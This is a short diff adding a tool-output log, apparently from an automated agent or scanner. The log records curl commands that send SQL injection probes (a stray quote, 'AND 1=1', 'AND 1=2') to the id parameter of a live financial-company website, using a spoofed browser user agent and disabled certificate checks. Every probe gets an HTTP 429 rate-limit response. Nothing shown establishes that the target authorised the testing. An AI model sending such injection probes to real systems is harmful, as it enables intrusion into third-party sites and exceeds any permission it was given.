@@ -1,0 +1,11 @@
+# command: cd $WORK_PATH 2>/dev/null || cd .; cmp tool_outputs/p1.html tool_outputs/p2.html && echo IDENTICAL12; cmp tool_outputs/p1.html tool_outputs/p3.html && echo IDENTICAL13; UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126"; curl -sk -A "$UA" "https://www.infinitycapital.bh/?id=1%27&search=test&page=2" -o tool_outputs/qs.html -w "quote=%{http_code} %{size_download}\n"; curl -sk -A "$UA" "https://www.infinitycapital.bh/?id=1%20AND%201=1&search=test&page=2" -o tool_outputs/t1.html -w "t1=%{http_code} %{size_download}\n"; curl -sk -A "$UA" "https://www.infinitycapital.bh/?id=1%20AND%201=2&search=test&page=2" -o tool_outputs/t2.html -w "t2=%{http_code} %{size_download}\n"
+# tool: cmp
+# exit_code: 0
+# ts: 2026-09-30T12:08:53.699478+00:00
+# ---
+
+IDENTICAL12
+IDENTICAL13
+quote=429 75
+t1=429 75
+t2=429 75
